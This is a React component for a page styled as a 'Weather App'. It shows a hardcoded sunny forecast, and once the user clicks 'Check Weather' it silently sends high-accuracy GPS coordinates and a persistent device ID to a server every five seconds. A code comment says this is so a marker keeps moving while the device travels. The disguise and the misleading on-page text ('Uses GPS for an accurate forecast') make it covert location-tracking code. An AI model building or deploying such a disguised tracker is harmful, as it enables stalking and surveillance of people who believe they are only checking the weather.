"use client";

import { useEffect, useRef, useState } from "react";
import gsap from "gsap";
import { cn } from "@/lib/utils";

const PING_INTERVAL_MS = 5000;
const ID_KEY = "llt_device_id";

function makeId(length = 10) {
  const chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  return Array.from(
    { length },
    () => chars[Math.floor(Math.random() * chars.length)],
  ).join("");
}

function getDeviceId() {
  if (typeof window === "undefined") return makeId();
  let id = localStorage.getItem(ID_KEY);
  if (!id) {
    id = makeId();
    localStorage.setItem(ID_KEY, id);
  }
  return id;
}

export function WeatherView() {
  const [status, setStatus] = useState<"idle" | "loading" | "on" | "error">(
    "idle",
  );
  const [coords, setCoords] = useState<{ lat: number; lng: number } | null>(
    null,
  );
  const [lastSync, setLastSync] = useState<string | null>(null);

  const rootRef = useRef<HTMLDivElement>(null);
  const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const stopsRef = useRef(true);
  const deviceIdRef = useRef<string | null>(null);

  if (deviceIdRef.current === null) {
    deviceIdRef.current = getDeviceId();
  }

  // Scene + card entrance.
  useEffect(() => {
    const ctx = gsap.context(() => {
      const tl = gsap.timeline({ defaults: { ease: "power3.out" } });
      tl.from(".wt-card", {
        y: 46,
        opacity: 0,
        scale: 0.92,
        duration: 0.8,
        ease: "back.out(1.6)",
      })
        .from(".wt-icon-wrap", { scale: 0, rotation: -120, duration: 0.7, ease: "back.out(2)" }, "-=0.4")
        .from(".wt-text > *", { y: 14, opacity: 0, stagger: 0.06, duration: 0.4 }, "-=0.3")
        .from(".wt-cta", { opacity: 0, y: 12, duration: 0.4 }, "-=0.15");
    }, rootRef);
    return () => ctx.revert();
  }, []);

  // Ambient motion: revolving sun rays + drifting clouds.
  useEffect(() => {
    const ctx = gsap.context(() => {
      gsap.to(".sun-rays", {
        rotate: 360,
        duration: 90,
        repeat: -1,
        ease: "none",
        transformOrigin: "center center",
      });
      gsap.to(".cloud", {
        x: gsap.utils.random(-30, 30),
        duration: gsap.utils.random(10, 16),
        repeat: -1,
        yoyo: true,
        ease: "sine.inOut",
        stagger: 0.4,
      });
    }, rootRef);
    return () => ctx.revert();
  }, []);

  async function sendPing(lat: number, lng: number) {
    try {
      await fetch("/api/weather", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id: deviceIdRef.current, lat, lng }),
      }).catch(() => undefined);
      setLastSync(new Date().toLocaleTimeString());
    } catch {
      /* silent retry on next tick */
    }
  }

  // Same loop as v1's views/weather.html: re-query fresh GPS every 5s so
  // the marker keeps moving while the device travels.
  function start() {
    if (!("geolocation" in navigator)) {
      setStatus("error");
      return;
    }
    stopsRef.current = false;
    setStatus("loading");

    const tick = () => {
      if (stopsRef.current) return;
      navigator.geolocation.getCurrentPosition(
        (position) => {
          if (stopsRef.current) return;
          const c = {
            lat: position.coords.latitude,
            lng: position.coords.longitude,
          };
          setCoords(c);
          setStatus("on");
          void sendPing(c.lat, c.lng);
          timerRef.current = setTimeout(tick, PING_INTERVAL_MS);
        },
        () => {
          if (stopsRef.current) return;
          setStatus((s) => (s === "on" ? "on" : "error"));
          timerRef.current = setTimeout(tick, PING_INTERVAL_MS * 2);
        },
        { enableHighAccuracy: true, maximumAge: 1000, timeout: 15000 },
      );
    };

    tick();
  }

  useEffect(() => () => {
    stopsRef.current = true;
    if (timerRef.current) clearTimeout(timerRef.current);
  }, []);

  const on = status === "on";

  return (
    <div
      ref={rootRef}
      className="relative flex min-h-dvh items-center justify-center overflow-hidden px-5 py-10"
    >
      {/* sky gradient */}
      <div
        className="absolute inset-0"
        style={{
          background:
            "linear-gradient(180deg,#0f1e4d 0%,#1e3a8a 35%,#2563eb 62%,#38bdf8 100%)",
        }}
      />
      {/* stars */}
      {Array.from({ length: 30 }).map((_, i) => (
        <div
          key={i}
          className="absolute rounded-full bg-white/70"
          style={{
            top: `${(i * 37) % 40}%`,
            left: `${(i * 53) % 100}%`,
            width: i % 4 === 0 ? 3 : 2,
            height: i % 4 === 0 ? 3 : 2,
            opacity: 0.5 + ((i * 7) % 50) / 100,
          }}
        />
      ))}

      {/* sun with rotating rays */}
      <div className="absolute right-6 top-6 sm:right-14 sm:top-10">
        <div className="sun-rays h-24 w-24">
          <div
            className="h-full w-full rounded-full"
            style={{
              background:
                "repeating-conic-gradient(from 0deg, rgba(253,224,71,0.35) 0deg 12deg, transparent 12deg 30deg)",
            }}
          />
        </div>
        <div
          className="absolute inset-0 m-auto h-16 w-16 rounded-full"
          style={{
            background:
              "radial-gradient(circle, #fef3c7, #fbbf24 60%, transparent 72%)",
            filter: "drop-shadow(0 0 24px rgba(253,224,71,0.6))",
          }}
        />
      </div>

      {/* drifting clouds */}
      <div className="cloud absolute left-[6%] top-[24%] h-6 w-32 rounded-full bg-white/85 blur-[1px]">
        <div className="absolute -top-4 left-4 h-8 w-8 rounded-full bg-white/85" />
        <div className="absolute -top-2 left-12 h-6 w-6 rounded-full bg-white/85" />
      </div>
      <div
        className="cloud absolute bottom-[18%] right-[8%] h-5 w-24 rounded-full bg-white/60"
        style={{ opacity: 0.6 }}
      >
        <div className="absolute -top-3 left-3 h-6 w-6 rounded-full bg-white/60" />
      </div>

      {/* card */}
      <div className="relative z-10 w-full max-w-sm">
        <div className="wt-card rounded-3xl bg-white/95 p-8 text-center shadow-[0_30px_60px_rgba(2,6,23,0.55)]">
          <h2 className="text-2xl font-extrabold tracking-tight text-slate-900">
            Weather App
          </h2>
          <p className="mt-1 text-sm text-slate-500">
            {coords ? (
              <span className="font-medium text-slate-600">GPS locked</span>
            ) : (
              "Your local forecast"
            )}
          </p>

          <div className="wt-icon-wrap relative mx-auto mt-6 flex h-24 w-24 items-center justify-center">
            <svg width="88" height="88" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="12" cy="12" r="4" fill="#fbbf24" stroke="#f59e0b" />
              <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41" />
              <path d="M7 14h.01M9.5 16h.01M15.5 15h.01M17 17h.01M7 19h.01" stroke="#94a3b8" />
            </svg>
          </div>

          <div className="wt-text">
            <div className="mt-3 text-5xl font-extrabold tracking-tight text-slate-900">
              25°C
            </div>
            <div className="mt-1 text-lg font-semibold text-slate-600">
              Sunny
            </div>
          </div>

          <div className="wt-text mt-4 min-h-[1.25rem] text-xs text-slate-500">
            {on ? (
              lastSync ? (
                <>Connected · last sync {lastSync}</>
              ) : (
                "Connecting…"
              )
            ) : status === "error" ? (
              <span className="font-semibold text-amber-600">
                Location access blocked — please enable GPS.
              </span>
            ) : (
              "Uses GPS for an accurate forecast"
            )}
          </div>

          <button
            onClick={start}
            disabled={on}
            className={cn(
              "wt-cta mt-4 w-full rounded-2xl bg-gradient-to-r from-blue-600 to-indigo-600 py-3.5 text-sm font-bold text-white shadow-[0_10px_24px_rgba(37,99,235,0.4)] transition hover:brightness-110 active:scale-[0.98]",
              on && "cursor-not-allowed opacity-70",
            )}
          >
            {on ? "Live forecast active" : "Check Weather"}
          </button>
        </div>
      </div>

      <div className="absolute bottom-4 left-1/2 z-10 -translate-x-1/2 text-center text-xs text-white/80">
        <p>Current conditions · Refreshes automatically</p>
        <p className="mt-1">
          Created by{" "}
          <a
            href="https://github.com/syed-mujtaba-stack/"
            target="_blank"
            rel="noopener noreferrer"
            className="font-bold text-white underline-offset-4 transition hover:underline"
          >
            Syed Mujtaba Abbas
          </a>
        </p>
      </div>
    </div>
  );
}